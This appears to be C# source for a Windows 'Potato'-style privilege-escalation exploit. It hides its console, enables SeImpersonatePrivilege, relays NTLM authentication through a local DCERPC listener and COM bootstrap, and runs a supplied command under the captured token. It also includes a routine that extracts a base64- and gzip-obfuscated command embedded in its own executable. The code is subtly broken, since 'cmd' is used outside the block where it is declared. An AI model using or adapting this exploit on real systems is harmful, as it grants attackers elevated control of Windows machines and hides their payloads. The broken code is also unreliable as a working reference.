using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using NtApiDotNet;
using SandboxAnalysisUtils;
using System.IO;
using System.IO.Compression;


namespace Potato
{

    public class Shell
    {
        static private bool nt_shell;

        static public bool NtShell
        {
            get
            {
                return nt_shell;
            }
            set
            {
                nt_shell = value;
            }
        }

        static public int ByteIndex (ref byte[] array, ref byte[] pattern)
        {

            for (int i = array.Length - pattern.Length; i > 0; i--)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (array[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found)
                {
                    return i;
                }
            }
            return -1;
        }

        static public string GetCommand(string exe_path)
        {
            int start_index = 0;
            int end_index = 0;
            int command_bytes = 0;

            byte[] split = { 0x3C, 0x73, 0x70, 0x6C, 0x69, 0x74, 0x3E };
            byte[] split_end = { 0x3C, 0x2F, 0x73, 0x70, 0x6C, 0x69, 0x74, 0x3E };
            byte[] exe_bytes = File.ReadAllBytes(exe_path);

            start_index = ByteIndex(ref exe_bytes, ref split);
            start_index += 7;
            end_index = ByteIndex(ref exe_bytes, ref split_end);
            command_bytes = end_index - (start_index+1);

            if (command_bytes < 0)
            {
                Console.WriteLine("COMMAND NOT FOUND !!!");
                Environment.Exit(-1);
            }

            byte[] encodedBytes = new byte[command_bytes];

            byte iter = exe_bytes[start_index];

            //Console.WriteLine(iter.ToString());

            Buffer.BlockCopy(exe_bytes, start_index+1, encodedBytes, 0, command_bytes);

            MemoryStream ms = null;
            StreamReader sr = null;
            String encodedCommand = System.Text.Encoding.Unicode.GetString(encodedBytes);

            for (int i=0; i != iter; i++)
            {
                
                byte[] compressedCommand = Convert.FromBase64String(encodedCommand);
                ms = new MemoryStream();
                ms.Write(compressedCommand, 0, compressedCommand.Length);
                ms.Seek(0, 0);
                sr = new StreamReader(new GZipStream(ms, CompressionMode.Decompress));
                encodedCommand = sr.ReadToEnd();
            }

            ms.Close();
            sr.Close();
            ms.Dispose();
            sr.Dispose();

            return encodedCommand;
        }
}


    public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static int Main(string[] args) 
        {
            IntPtr handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);


            InvokePrivs.EnablePriv("SeImpersonatePrivilege");

            if (args.LongLength > 0) { 
                string cmd = args[0];  //= Shell.GetCommand(Process.GetCurrentProcess().MainModule.FileName);
            }
            else
                Environment.Exit(-1);

            DCERPCNtlmHandler dcerpcServer = new DCERPCNtlmHandler();
            Thread bootstrapThread = null;
            Thread dcerpcThread = null;
         
            dcerpcThread = new Thread(() => dcerpcServer.start("127.0.0.1", "6666", "127.0.0.1", "135", false, "true", cmd));
            dcerpcThread.Start();
            Thread.Sleep(100);
                try
                {
                    bootstrapThread = new Thread(() => ComUtils.BootstrapComMarshal());
                    bootstrapThread.Start();
                }
                catch (Exception e)
                {
                    Console.WriteLine("This wasn't supposed to happen... {0}", e);
                }

            
            if(dcerpcThread != null)
            {
                DCERPCNtlmHandler.finished.WaitOne();
                if (!Shell.NtShell)
                {
                    NtToken main_token = NtToken.OpenProcessToken();

                    //TokenUtils.CreateProcessForToken("powershell.exe -EncodedCommand " + cmd, main_token, false);
                    TokenUtils.CreateProcessForToken(cmd, main_token, false);

                }

                Thread.Sleep(100);
                Environment.Exit(0);


                dcerpcThread.Abort();
                bootstrapThread.Abort();
            }
            Environment.Exit(0);
            return 0;
        }


    }
}
